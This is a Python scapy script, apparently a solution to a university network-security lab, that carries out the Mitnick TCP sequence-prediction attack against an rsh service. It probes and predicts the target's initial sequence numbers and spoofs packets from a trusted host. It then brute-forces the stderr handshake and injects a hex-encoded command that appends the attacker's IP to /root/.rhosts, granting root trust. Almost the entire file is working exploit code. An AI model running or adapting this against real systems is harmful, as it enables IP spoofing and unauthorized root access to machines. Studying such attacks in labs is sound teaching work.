import random
import sys
import threading
import time

from scapy.all import *


SYN  = 0b000010
RST  = 0b000100
PSH  = 0b001000
ACK  = 0b010000

SYN_ACK = SYN | ACK
PSH_ACK = PSH | ACK
RST_ACK = RST | ACK

RSH = 514


if __name__ == "__main__":
    """ 
    Usage:

    python3 shared-with-host/abadia2/NetSec/cp2.2.mitnick.py eth0 10.4.61.25 72.36.89.200 

    Tips:
    
      1. Study the RSH protool by running "root@attacker:~# rsh 10.4.61.25 uname" -ns 
        - Look at the cp2.2.mitnick/rsh.pcapng file in Wireshark for an example run
    
      2. Send each packet from the attacker and study the Osiris' and Trusted Server's responses.
         If you send too many packets too quickly, you may miss import responses such as Osiris or
         initiating new ACK's or SYN's based on packets you sent it. 
    """
    
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])
    my_ip_layer = IP(src=my_ip, dst=target_ip)
    target_ip_layer = IP(src=trusted_host_ip, dst=target_ip)

    conf.verb = 0


    for i in range(20):

        my_port = random.randint(49152, 65535)
        trusted_host_port = 1023

        # Probe SYN from my random port
        rp = sr1(
            my_ip_layer / TCP(
                seq=0, 
                sport=my_port, 
                dport=RSH, 
                flags=SYN
            ), 
            timeout=3
        )
        
        if rp is None:
            continue
        
        if not rp.haslayer(TCP):
            continue
        
        if rp[TCP].flags.value != SYN_ACK:
            continue
        
        time.sleep(1)
        send(
            my_ip_layer / TCP(
                seq=1, 
                ack=rp[TCP].seq + 1, 
                sport=my_port, 
                dport=RSH, 
                flags=RST_ACK
            )
        )
        
        time.sleep(1)
        dt = 2
        ct = int(2 * dt) - 1
        predicted_ack = int(rp[TCP].seq + (ct * 64_000) + 1)
        print(
            'seq: ', rp[TCP].seq, 
            ', dt: ', dt, 
            ', ct: ', ct, 
            ', predicted_ack: ', predicted_ack
        )

        # Keep modifying delay until you consistently guess the ACK
        time.sleep(1)

        # TODO: TCP hijacking with predicted sequence number
        send(
            target_ip_layer / TCP(
                sport=trusted_host_port, 
                dport=RSH, 
                flags=SYN
            )
        )

        # Wait for Osiris to send SYN+ACK
        time.sleep(2) 

        send(
            target_ip_layer / TCP(
                seq=1, 
                ack=predicted_ack, 
                sport=trusted_host_port, 
                dport=RSH, 
                flags=ACK
            )
        )

        time.sleep(1) 

        # RSH Protocol
        # 
        # Step 1: Define where to direct the standard error:
        #
        #   The rshd daemon reads characters from the socket up to a null 
        #   byte. The string is interpreted as an ASCII number (base 10). 
        #
        #     - Nonzero, the rshd daemon interprets it as the port number 
        #       of a secondary stream to be used as standard error.
        #
        # It appears any port other than 1022 will immediately be closed. 
        # In Wireshark, you will see FIN+ACK.
        send(
            target_ip_layer / TCP(
                ack=predicted_ack, 
                seq=1, 
                sport=trusted_host_port, 
                dport=RSH,
                flags=PSH_ACK
            ) / Raw(load=b"\x31\x30\x32\x32\x00")
        )
        # send(
        #     target_ip_layer / TCP(
        #         ack=predicted_ack, 
        #         seq=1, 
        #         sport=trusted_host_port, 
        #         dport=RSH,
        #         flags=PSH_ACK
        #     ) / Raw(load=b"\x30\x00")
        # )

        # The Target will ACK the RSH Protocol Step 1 and then initiate
        # a TCP hanshake for the specified port to send standard error data.
        time.sleep(1)

        # Complete the TCP handshake:
        #
        #  (predicted_ack - 1) to get our original prediction.
        #
        # Since my VM keeps breaking, just spam SYN+ACKS and brute force:
        for i in range(10):
            for port_offset in range(2):
                send(
                    target_ip_layer / TCP(
                        ack=(predicted_ack) + 64_000 * i, 
                        seq=0, 
                        sport=1022, 
                        dport=trusted_host_port - port_offset, 
                        flags=SYN_ACK
                    )
                )

        # Step 2: Send the RSH command
        #
        #   The rshd daemon retrieves the following information from the 
        #   initial socket:
        #
        #     - A null-terminated string of at most 16 bytes interpreted 
        #       as the user name of the user on the client host.
        #     - A null-terminated string of at most 16 bytes interpreted 
        #       as the user name to be used on the local server host.
        #     - Another null-terminated string interpreted as a command 
        #       line to be passed to a shell on the local server host.
        #
        # root\x00root\x00echo '
        prefix = b"\x72\x6f\x6f\x74\x00\x72\x6f\x6f\x74\x00\x65\x63\x68\x6f\x20\x27"

        # root' >> /root/.rhosts\x00
        suffix = b"\x20\x72\x6f\x6f\x74\x27\x20\x3e\x3e\x20\x2f\x72\x6f\x6f\x74\x2f\x2e\x72\x68\x6f\x73\x74\x73\x00"

        # root\x00root\x00echo '10.4.22.74 root' >> /root/.rhosts\x00
        send(
            target_ip_layer / TCP(
                seq=1 + 5, 
                ack=predicted_ack, 
                sport=trusted_host_port, 
                dport=RSH, 
                flags=PSH_ACK
            ) / Raw(load=prefix + my_ip.encode() + suffix)
        )

        time.sleep(1)

        # Reset connections
        send(
            target_ip_layer / TCP(
                seq=1 + 5 + 51, 
                ack=predicted_ack, 
                sport=trusted_host_port, 
                dport=RSH, 
                flags=RST_ACK
            )
        )

        for i in range(10):
            for port_offset in range(2):
                send(
                    target_ip_layer / TCP(
                        ack=(predicted_ack) + 64_000 * i, 
                        seq=0, 
                        sport=1022, 
                        dport=trusted_host_port - port_offset, 
                        flags=RST_ACK
                    )
                )
